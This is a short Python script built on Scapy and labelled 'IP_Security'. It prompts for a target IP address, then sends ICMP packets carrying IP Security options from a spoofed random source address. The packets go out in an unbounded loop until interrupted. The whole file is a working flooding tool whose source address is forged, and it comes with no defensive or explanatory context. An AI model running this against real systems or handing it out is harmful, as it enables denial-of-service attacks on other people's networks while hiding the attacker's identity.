import scapy.all as scapy
import os


def IP_Security():

	clear = os.system('clear')

	print("**************************************")
	print("            IP_Security")
	print("**************************************")

	print("Please input your target's IP")
	target = input("[IP_Security]# ")
	src_ip = scapy.RandIP()
	num = 0
	try:
		while True:
			packet = scapy.IP(src=src_ip,dst=target,options=[scapy.IPOption_Security(),scapy.IPOption_EOL(),scapy.IPOption_EOL()])/scapy.ICMP()
			scapy.send(packet,verbose=False)
			num += 1
			print("Sent "+str(num)+"packets")
	except KeyboardInterrupt:
		print("Ctrl + C detected......")
	
IP_Security()